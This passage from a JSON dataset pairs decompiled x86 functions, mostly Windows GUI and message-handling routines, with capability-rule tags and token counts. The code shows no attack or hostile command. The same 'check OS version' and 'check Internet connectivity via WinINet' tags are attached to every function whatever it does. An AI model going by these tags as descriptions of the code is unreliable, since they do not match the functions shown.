        "decompiled_code": "\nvoid __fastcall fcn.0043a130(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uchar auStack28 [5];\n    uint32_t uStack23;\n    \n    cVar1 = fcn.004033e4();\n    if ((*0x463b34 != '\\0') && (cVar1 == '\\0')) {\n        fcn.00403408();\n    }\n    fcn.00439070();\n    if (*(param_2 + 4) < 3) {\n        auStack28[0] = 1;\n        if (cVar1 == '\\0') {\n            uVar2 = uStack23 & 0xffffff00 | *(param_2 + 4);\n            fcn.00403454(auStack28, uVar2, uStack23);\n        }\n        else {\n            uVar2 = uStack23 & 0xffffff00 | *(param_2 + 4);\n            fcn.00403454(auStack28, uVar2, uStack23);\n        }\n        *(param_2 + 0xc) = uVar2 & 0xff;\n    }\n    else if (*(param_2 + 4) == 3) {\n        if (cVar1 == '\\0') {\n            fcn.00403454(uStack23);\n        }\n        else {\n            fcn.00403454(uStack23);\n        }\n    }\n    return;\n}\n",
        "token_count": 319
    },
    "0043a220": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0043a220(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t in_EDX;\n    uint *in_FS_OFFSET;\n    uint uStack80;\n    uint *arg_8h_00;\n    uint var_34h;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint uStack24;\n    uint uStack20;\n    int32_t var_ch;\n    uint8_t var_5h;\n    uint var_4h;\n    \n    if ((in_EDX == 0) || (in_EDX == -1)) {\n        iVar3 = *(in_EAX + 0xa0);\n        if (((iVar3 == 0) || (*(iVar3 + 0x1a7) == '\\0')) || (*(iVar3 + 0x17c) == 0)) {\n            fcn.00412708();\n            var_1ch = var_24h;\n            var_18h = var_20h;\n            if (*(in_EAX + 0x30) != 0) {\n                fcn.00439044();\n                var_1ch = var_24h;\n                var_18h = var_20h;\n            }\n        }\n        else {\n            (**(**(iVar3 + 0x17c) + 0x14))();\n            var_34h = 2;\n            fcn.0043fd08();\n            sub.user32.dll_MapWindowPoints();\n        }\n        uVar1 = fcn.004394bc();\n        arg_8h_00 = &fcn.0043a220::var_34h;\n        uStack80 = 0x43a2d1;\n        fcn.004394d0();\n        uStack80 = 0x43a2de;\n        fcn.00412758(arg_8h_00, uVar1);\n        var_1ch = var_34h;\n        var_18h = uStack52;\n        uStack24 = uStack48;\n        uStack20 = uStack44;\n        uStack80 = 0x43a2f2;\n        uVar2 = fcn.0043a400();\n        var_5h = uVar2;\n        goto code_r0x0043a3f2;\n    }\n    uVar1 = fcn.0043a708();\n    if (*(in_EAX + 0xa0) == 0) {\ncode_r0x0043a325:\n        uVar2 = CONCAT31(uVar1 >> 8, 1);\n    }\n    else {\n        uVar1 = fcn.00403454();\n        if (uVar1 != '\\0') goto code_r0x0043a325;\n        uVar2 = 0;\n    }\n    var_5h = uVar2;\n    if (var_5h != 0) {\n        var_ch = fcn.00436c40();\n        uStack80 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffb0;\n        if (*(in_EAX + 0xa0) == 0) {\n            iVar3 = 0;\n        }\n        else {\n            iVar3 = fcn.0043fd08();\n        }\n        fcn.00438ecc();\n        if (iVar3 != 0) {\n            sub.user32.dll_MapWindowPoints(iVar3, 0, &fcn.0043a220::var_1ch, 2);\n        }\n        *(var_ch + 4) = in_EDX;\n        *(var_ch + 0x54) = arg_8h;\n        *(var_ch + 0x58) = var_4h;\n        *(var_ch + 0x44) = var_1ch;\n        *(var_ch + 0x48) = var_18h;\n        *(var_ch + 0x4c) = uStack24;\n        *(var_ch + 0x50) = uStack20;\n        uVar1 = fcn.0043fd08(&fcn.0043a220::var_1ch, 1);\n        sub.user32.dll_MapWindowPoints(0, uVar1);\n        fcn.00403454();\n        *in_FS_OFFSET = var_18h;\n        uVar2 = fcn.00403258(0x43a3f2);\n        return uVar2;\n    }\ncode_r0x0043a3f2:\n    return uVar2 & 0xffffff00 | var_5h;\n}\n",
        "token_count": 1035
    },
    "0043a4a4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0043a4a4(uint param_1)\n\n{\n    uint32_t in_EAX;\n    uint uStack8;\n    \n    uStack8 = CONCAT31(param_1 >> 8, 1);\n    if (*(in_EAX + 0xc2) != 0) {\n        in_EAX = (**(in_EAX + 0xc0))(&uStack8, param_1);\n    }\n    return CONCAT44(uStack8, in_EAX & 0xffffff00 | uStack8 & 0xff);\n}\n",
        "token_count": 121
    },
    "0043a570": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043a570(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0xca) != 0) {\n        (**(in_EAX + 200))(arg_8h, arg_ch);\n    }\n    return;\n}\n",
        "token_count": 71
    },
    "0043a600": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043a600(int32_t **param_1, int32_t **param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t *piStack28;\n    int32_t *piStack24;\n    int32_t iStack20;\n    int32_t iStack16;\n    \n    piStack28 = *(in_EAX[0x1d] + 0x14);\n    if (piStack28 == NULL) {\n        piStack28 = NULL;\n    }\n    piStack24 = *(in_EAX[0x1d] + 0x10);\n    if (piStack24 == NULL) {\n        piStack24 = NULL;\n    }\n    iStack20 = *(in_EAX[0x1d] + 0xc);\n    if (iStack20 == 0) {\n        iStack20 = 0;\n    }\n    iStack16 = *(in_EAX[0x1d] + 8);\n    if (iStack16 == 0) {\n        iStack16 = 0;\n    }\n    (**(*in_EAX + 0x38))();\n    if ((piStack28 < 1) || (*param_2 <= piStack28)) {\n        if ((0 < &iStack16) && (*param_2 < &iStack16)) {\n            *param_2 = &iStack16;\n        }\n    }\n    else {\n        *param_2 = piStack28;\n    }\n    if ((piStack24 < 1) || (*param_1 <= piStack24)) {\n        if ((0 < &iStack20) && (*param_1 < &iStack20)) {\n            *param_1 = &iStack20;\n        }\n    }\n    else {\n        *param_1 = piStack24;\n    }\n    return;\n}\n",
        "token_count": 396
    },
    "0043a708": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t fcn.0043a708(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint32_t uVar2;\n    \n    uVar2 = (**(*in_EAX + 0x54))();\n    if (uVar2 != '\\0') {\n        in_EAX[0x2b] = in_EAX[0x13];\n        in_EAX[0x2a] = in_EAX[0x12];\n        return in_EAX[0x12];\n    }\n    if (in_EAX[0x28] != 0) {\n        if ((*(in_EAX + 0x27) == '\\x02') || (*(in_EAX[0x28] + 0x5b) - 1U < 2)) {\n            uVar2 = in_EAX[0x13];\n            in_EAX[0x2d] = uVar2;\n        }\n        else if ((*(in_EAX + 0x27) == '\\x01') ||\n                (cVar1 = *(in_EAX[0x28] + 0x5b),  uVar2 = in_EAX[0x28] & 0xffffff00U | cVar1 - 5,  cVar1 - 3U < 2)) {\n            uVar2 = in_EAX[0x12];\n            in_EAX[0x2c] = uVar2;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 327
    },
    "0043a7a0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0043a7a0(uint param_1, uint32_t *param_2)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    uint lpKeyState;\n    int32_t *var_14h;\n    uint32_t var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    \n    if (((((*(in_EAX + 7) & 0x10) != 0) && (var_14h = fcn.004506c0(),  var_14h != NULL)) && (var_14h[0x94] != 0)) &&\n       (cVar2 = (**(*var_14h[0x94] + 0x24))(),  cVar2 != '\\0')) {\n        return;\n    }\n    if ((*param_2 < 0x100) || (0x108 < *param_2)) {\n        uVar1 = *param_2;\n        if ((uVar1 < 0x200) || (0x20a < uVar1)) {\n            if (uVar1 == 0xb00b) {\n                fcn.004390cc(param_2[2]);\n            }\n        }\n        else {\n            if (((*(in_EAX + 0x14) & 0x80) == 0) && (((uVar1 == 0x203 || (uVar1 == 0x206)) || (uVar1 == 0x209)))) {\n                *param_2 = *param_2 - 2;\n            }\n            uVar1 = *param_2;\n            if (uVar1 == 0x200) {\n                fcn.00459e6c();\n            }\n            else {\n                if (uVar1 != 0x201) {\n                    if (uVar1 == 0x202) {\n                        *(in_EAX + 0x15) = *(in_EAX + 0x15) & 0xfffe;\n                        goto code_r0x0043a922;\n                    }\n                    if (uVar1 != 0x203) {\n                        if (((*(*0x463b10 + 0x20) != '\\0') && (*(*0x463b10 + 0x1c) != 0)) &&\n                           (*param_2 == *(*0x463b10 + 0x1c))) {\n                            sub.user32.dll_GetKeyboardState(&lpKeyState);\n                            var_10h = *param_2;\n                            var_ch._0_1_ = fcn.00450604();\n                            var_ch._2_2_ = *(param_2 + 1);\n                            var_8h = param_2[2];\n                            fcn.00403454();\n                            return;\n                        }\n                        goto code_r0x0043a922;\n                    }\n                }\n                if (*(in_EAX + 0x5d) == '\\x01') {\n                    fcn.00403454();\n                    return;\n                }\n                *(in_EAX + 0x15) = *(in_EAX + 0x15) | 1;\n            }\n        }\n    }\n    else {\n        var_14h = fcn.004506c0();\n        if ((var_14h != NULL) && (cVar2 = (**(*var_14h + 0xf0))(),  cVar2 != '\\0')) {\n            return;\n        }\n    }\ncode_r0x0043a922:\n    (**(*in_EAX + -0x14))();\n    return;\n}\n",
        "token_count": 790
    },
    "0043aa5c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0043aa5c(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    if (*(in_EAX + 0x122) != 0) {\n        iVar1 = (**(*in_EAX + 0x3c))();\n        if (iVar1 != 0) {\n            iVar1 = (**(*in_EAX + 0x3c))();\n            if (*(iVar1 + 0x40) != in_EAX[0x48]) {\n                (*in_EAX[0x48])();\n                return;\n            }\n        }\n    }\n    if (((*(in_EAX + 7) & 0x10) == 0) && (in_EAX[0x1b] != 0)) {\n        (**(*in_EAX[0x1b] + 0x18))();\n    }\n    else if (*(in_EAX + 0x122) != 0) {\n        (*in_EAX[0x48])();\n    }\n    return;\n}\n",
        "token_count": 225
    },
    "0043aae8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.0043aae8(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    uint in_ECX;\n    uint var_1h;\n    \n    if (*(in_EAX + 0xd2) != 0) {\n        (**(in_EAX + 0xd0))(arg_8h, arg_ch, in_ECX);\n    }\n    return;\n}\n",
        "token_count": 108
    },
    "0043ac64": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nchar __fastcall fcn.0043ac64(uint *param_1, uint *param_2)\n\n{\n    uint uVar1;\n    uint uVar2;\n    char cVar3;\n    int32_t in_EAX;\n    char cVar4;\n    \n    cVar4 = '\\0';\n    uVar1 = *param_2;\n    uVar2 = *param_1;\n    cVar3 = fcn.0043a540();\n    if (cVar3 != '\\0') {\n        if (((*(in_EAX + 0x5c) == '\\0') || (cVar3 = fcn.0043a4d4(),  cVar3 != '\\0')) ||\n           (cVar3 = fcn.0043a540(),  cVar3 != '\\0')) {\n            cVar4 = '\\x01';\n        }\n        else {\n            cVar4 = '\\0';\n        }\n        if (cVar4 != '\\0') {\n            *param_2 = uVar1;\n            *param_1 = uVar2;\n        }\n    }\n    return cVar4;\n}\n",
        "token_count": 241
    },
    "0043ada0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.0043ada0(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint var_1h;\n    \n    if (*(in_EAX + 0xda) != 0) {\n        (**(in_EAX + 0xd8))(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 89
    },
    "0043ae48": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.0043ae48(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    uint in_ECX;\n    uint var_1h;\n    \n    if (*(in_EAX + 0xe2) != 0) {\n        (**(in_EAX + 0xe0))(arg_8h, arg_ch, in_ECX);\n    }\n    return;\n}\n",
        "token_count": 107
    },
    "0043b1a8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043b1a8(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    \n    if ((*(*0x462210 + 0xd) != '\\0') && (*(param_2 + 4) == 0)) {\n        (**(*in_EAX + 0x7c))();\n    }\n    return;\n}\n",
        "token_count": 87
    },
    "0043b220": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0043b220(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x56) != '\\0') {\n        fcn.00439620();\n        *(in_EAX + 0x56) = 1;\n    }\n    return;\n}\n",
        "token_count": 67
    },
    "0043b394": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043b394(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uint var_8h;\n    uint var_4h;\n    \n    cVar1 = (**(*in_EAX + 0x54))();\n    if ((cVar1 == '\\0') || (in_EAX[0xc] == 0)) {\n        iVar2 = fcn.0043b284();\n        if (iVar2 != 0) {\n            *(*(param_2 + 8) + 4) = iVar2;\n            uVar3 = fcn.0043fd08();\n            *(*(param_2 + 8) + 8) = uVar3;\n        }\n    }\n    else {\n        fcn.0043b308(&stack0xfffffffc);\n    }\n    return;\n}\n",
        "token_count": 207
    },
    "0043b3f4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0043b43b)\n\nvoid __fastcall fcn.0043b3f4(char param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x43b4e2;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    cVar1 = fcn.004033e4();\n    if (cVar1 != '\\0') {\n        if (param_1 != '\\0') {\n            fcn.0043952c();\n        }\n        fcn.0043955c();\n        if ((param_1 == '\\0') || (cVar1 = (**(*in_EAX + 0x50))(),  cVar1 == '\\x01')) {\n            (**(*in_EAX + 100))();\n        }\n        if ((param_1 == '\\0') || (in_EAX[0x20] == 0)) {\n            fcn.00403ffc();\n        }\n        if ((param_1 == '\\0') || (*(in_EAX + 0x57) == '\\x01')) {\n            fcn.0043944c();\n        }\n        if ((param_1 == '\\0') || (*(in_EAX + 0x122) == 0)) {\n            in_EAX[0x48] = *(param_2 + 0x40);\n            in_EAX[0x49] = *(param_2 + 0x44);\n        }\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x43b4e9;\n    uStack32 = 0x43b4e1;\n    fcn.00403fcc();\n    return;\n}\n",
        "token_count": 445
    },
    "0043b898": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043b898(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint uStack52;\n    uint uStack48;\n    uchar auStack28 [12];\n    \n    if (*(param_2 + 0xc) == 0) {\n        if ((*(in_EAX + 7) & 0x10) == 0) {\n            fcn.00406960();\n            cVar1 = fcn.00412780();\n            if (cVar1 == '\\0') {\n                fcn.00439070();\n                (**(*in_EAX + 0x44))(uStack52, uStack48);\n                iVar2 = sub.user32.dll_PtInRect(auStack28);\n                if (iVar2 == 0) {\n                    (**(*in_EAX + -0x10))();\n                    return;\n                }\n            }\n            fcn.00403454();\n            *(param_2 + 0xc) = 0;\n            piVar3 = fcn.00403454();\n            if ((piVar3 != NULL) && (*(piVar3 + 0x61) != '\\0')) {\n                fcn.0043909c();\n                piVar3[0x19] = in_EAX;\n                cVar1 = fcn.00412780();\n                if (cVar1 != '\\0') {\n                    fcn.00412708();\n                    fcn.00439044();\n                }\n                (**(*piVar3 + 0x40))();\n                *(param_2 + 0xc) = 1;\n            }\n            if (*(param_2 + 0xc) == 0) {\n                (**(*in_EAX + -0x10))();\n            }\n        }\n        else {\n            (**(*in_EAX + -0x10))();\n        }\n    }\n    return;\n}\n",
        "token_count": 429
    },
    "0043bb58": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0043bb58(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    char extraout_DL;\n    \n    piVar1 = fcn.004035e4();\n    fcn.004197bc();\n    if (*(piVar1 + 0x6a) != '\\0') {\n        *(piVar1 + 0x6a) = 0;\n        fcn.004371d8();\n    }\n    fcn.00405648();\n    fcn.00403258();\n    if (piVar1[0xc] != 0) {\n        fcn.0043c7f8();\n    }\n    if (piVar1[0x60] != 0) {\n        (**(*piVar1 + 0xac))();\n    }\n    iVar2 = fcn.0043ca38();\n    while (iVar2 != 0) {\n        piVar3 = fcn.0043c9fc();\n        fcn.0043c864();\n        (**(*piVar3 + -4))();\n        iVar2 = fcn.0043ca38();\n    }\n    fcn.00403258();\n    if (piVar1[99] != 0) {\n        fcn.0041a644();\n    }\n    fcn.00438704();\n    if ('\\0' < extraout_DL) {\n        fcn.004035cc();\n    }\n    return;\n}\n",
        "token_count": 320
    },
    "0043bc28": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0043bc28(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x19c) == 0) {\n        return;\n    }\n    puStack28 = 0x43bc4f;\n    fcn.00403228();\n    uStack32 = 0x43bcec;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    iVar3 = *(*(in_EAX + 0x19c) + 8);\n    puStack28 = &stack0xfffffffc;\n    fcn.00413d04();\n    iVar2 = iVar3;\n    if (-1 < iVar3 + -1) {\n        do {\n            iVar1 = fcn.00413b64();\n            if ((-1 < *(iVar1 + 0x1a0)) && (*(iVar1 + 0x1a0) < iVar3)) {\n                fcn.00413c58();\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    if (-1 < iVar3 + -1) {\n        do {\n            iVar2 = fcn.00413b64();\n            if (iVar2 != 0) {\n                fcn.0043fec8();\n            }\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x43bcf3;\n    uStack32 = 0x43bceb;\n    fcn.00403258();\n    return;\n}\n",
        "token_count": 423
    },
    "0043c244": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043c244(int32_t arg_8h)\n\n{\n    char in_AL;\n    char cVar1;\n    int32_t iVar2;\n    int32_t arg_8h_00;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_8h;\n    uint var_4h;\n    \n    (**(**(arg_8h + -0xc) + 8))();\n    if (((*(arg_8h + -0x10) != 0) &&\n        (((in_AL == '\\0' || (*(*(arg_8h + -0x10) + 0x57) != '\\0')) ||\n         (((*(*(arg_8h + -0x10) + 0x1c) & 0x10) != 0 && ((*(*(arg_8h + -0x10) + 0x51) & 4) == 0)))))) &&\n       (in_AL == *(*(arg_8h + -0x10) + 0x5b))) {\n        fcn.00413a08();\n    }\n    var_8h = fcn.0043ca38();\n    if (-1 < var_8h + -1) {\n        do {\n            iVar2 = fcn.0043c9fc();\n            if (((in_AL == *(iVar2 + 0x5b)) &&\n                ((((in_AL == '\\0' || (*(iVar2 + 0x57) != '\\0')) || (*0x43c3b0 == (*0x43c3b0 & *(iVar2 + 0x50)))) ||\n                 (((*(iVar2 + 0x1c) & 0x10) != 0 && ((*(iVar2 + 0x51) & 4) == 0)))))) && (iVar2 != *(arg_8h + -0x10))) {\n                for (iVar2 = 0; iVar2 < *(*(arg_8h + -0xc) + 8); iVar2 = iVar2 + 1) {\n                    arg_8h_00 = arg_8h;\n                    fcn.00413b64();\n                    cVar1 = fcn.0043bd78(arg_8h_00);\n                    if (cVar1 != '\\0') break;\n                }\n                fcn.00413be0();\n            }\n            var_8h = var_8h + -1;\n        } while (var_8h != 0);\n    }\n    var_8h = *(*(arg_8h + -0xc) + 8);\n    if (-1 < var_8h + -1) {\n        do {\n            iVar2 = arg_8h;\n            fcn.00413b64();\n            fcn.0043be04(iVar2);\n            var_8h = var_8h + -1;\n        } while (var_8h != 0);\n    }\n    return;\n}\n",
        "token_count": 652
    },
    "0043c3b4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0043c3b4(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = fcn.0043ca38();\n    iVar1 = iVar1 + -1;\n    if (-1 < iVar1) {\n        do {\n            iVar2 = fcn.0043c9fc();\n            if (*(iVar2 + 0x5b) != '\\0') {\n                return 1;\n            }\n            iVar2 = fcn.0043c9fc();\n            if (*0x43c404 != *(iVar2 + 0x61)) {\n                return 1;\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != -1);\n    }\n    return 0;\n}\n",
        "token_count": 173
    },
    "0043c408": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0043c408(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (((*(in_EAX + 0x6a) != '\\0') && (*(in_EAX + 0x1a7) != '\\0')) && (in_EAX[0x5f] != 0)) {\n        (**(*in_EAX[0x5f] + 0x2c))();\n    }\n    uStack32 = 0x43c452;\n    cVar1 = fcn.0043c3b4(&stack0xfffffffc);\n    if (cVar1 != '\\0') {\n        (**(*in_EAX + 0x8c))();\n        fcn.00403228();\n        uStack32 = 0x43c4e7;\n        uStack36 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffdc;\n        fcn.0043c244(&stack0xfffffffc);\n        fcn.0043c244(&stack0xfffffffc);\n        fcn.0043c244(&stack0xfffffffc);\n        fcn.0043c244(&stack0xfffffffc);\n        fcn.0043c244(&stack0xfffffffc);\n        fcn.0043c244(&stack0xfffffffc);\n        fcn.0043c244(&stack0xfffffffc);\n        fcn.00403454();\n        *in_FS_OFFSET = uStack36;\n        uStack32 = 0x43c4e6;\n        fcn.00403258();\n        return;\n    }\n    if (*(in_EAX + 0x1a6) != '\\0') {\n        fcn.00403454();\n    }\n    return;\n}\n",
        "token_count": 423
    },
    "0043c50c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
